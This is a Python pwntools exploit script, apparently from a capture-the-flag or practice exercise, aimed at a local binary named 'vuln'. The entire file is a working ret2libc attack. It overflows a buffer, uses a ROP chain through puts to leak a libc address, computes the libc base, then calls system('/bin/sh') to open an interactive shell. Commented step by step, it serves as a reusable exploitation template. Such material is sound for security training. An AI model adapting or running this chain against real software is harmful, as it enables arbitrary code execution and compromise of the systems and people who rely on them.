# coding: utf-8
from pwn import *

# Choose and run
p = process("./vuln")

# Inspect files
binary = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# Get gadgets from binary
binary_gadgets = ROP(binary)

# Get a "pop rdi" (first param goes to rdi)
POP_RDI = (binary_gadgets.find_gadget(['pop rdi', 'ret']))[0]
# or ROPgadget --binary vuln | grep "pop rdi"

# RET = (binary_gadgets.find_gadget(['ret']))[0]

# Get puts plt address to exec put()
plt_puts = binary.plt['puts']

# Get main address to exec main()
plt_main = binary.symbols['main']

# Get got puts for the leak addr
got_puts = binary.got['puts']


junk = "A" * 40      # Fill buffer

rop = junk
rop += p64(POP_RDI)  # Put next line as first param
rop += p64(got_puts) # Param
rop += p64(plt_puts) # Exec puts()
rop += p64(plt_main) # Restart main()

p.sendlineafter("ROP.", rop)

p.recvline()
p.recvline()

# Get and parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked lib puts  : %s", hex(leak))

# puts offset in libc
log.info("libc puts offset : %s", hex(libc.sym["puts"]))

# Set lib base address (next sym() calls will rely ont he new address) 
libc.address = leak - libc.sym["puts"]
log.info("libc start addr  : %s", hex(libc.address))


BINSH = next(libc.search("/bin/sh")) # Get /bin/sh addr
SYSTEM = libc.sym["system"] # Get system addr

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))


rop2 = junk 
#rop2 += p64(RET)
rop2 += p64(POP_RDI)
rop2 += p64(BINSH)
rop2 += p64(SYSTEM)

p.sendlineafter("ROP.", rop2)
p.interactive()
